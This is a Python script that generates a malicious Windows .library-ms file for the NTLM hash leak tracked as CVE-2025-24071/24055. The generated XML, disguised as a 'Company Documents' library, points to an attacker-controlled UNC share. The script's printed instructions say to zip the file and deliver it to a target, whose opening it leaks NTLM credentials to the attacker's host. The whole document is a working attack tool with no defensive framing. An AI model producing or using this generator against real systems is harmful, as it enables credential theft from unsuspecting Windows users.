#!/usr/bin/env python3
"""Create .library-ms file for CVE-2025-24071/24055 NTLM leak.

Usage: python3 create_library_ms.py <attacker_ip> <output_file.library-ms>
"""

import sys
import os

def create_library_ms(attacker_ip, output_file):
    """Generate a .library-ms file pointing to attacker UNC path."""
    
    xml_content = f'''<?xml version="1.0" encoding="UTF-8"?>
<libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">
  <version>6</version>
  <name>Company Documents</name>
  <isLibraryPinned>false</isLibraryPinned>
  <iconReference>shell32.dll,-235</iconReference>
  <templateInfo>
    <folderType>{{7d49d726-3c21-4f05-99aa-fdc2c9474656}}</folderType>
  </templateInfo>
  <searchConnectorDescriptionList>
    <searchConnectorDescription>
      <simpleLocation>
        <url>\\\\{attacker_ip}\\share</url>
      </simpleLocation>
    </searchConnectorDescription>
  </searchConnectorDescriptionList>
</libraryDescription>
'''
    
    with open(output_file, 'w', encoding='utf-8') as f:
        f.write(xml_content)
    
    print(f"[+] Created {output_file}")
    print(f"[*] To use: zip the file and deliver to target")
    print(f"[*] Victim opening .library-ms from ZIP triggers NTLM leak")

def main():
    if len(sys.argv) < 3:
        print("Usage: python3 create_library_ms.py <attacker_ip> <output_file.library-ms>")
        print("Example: python3 create_library_ms.py 10.10.14.2 documents.library-ms")
        sys.exit(1)
    
    attacker_ip = sys.argv[1]
    output_file = sys.argv[2]
    
    if not output_file.endswith('.library-ms'):
        output_file += '.library-ms'
    
    create_library_ms(attacker_ip, output_file)

if __name__ == '__main__':
    main()
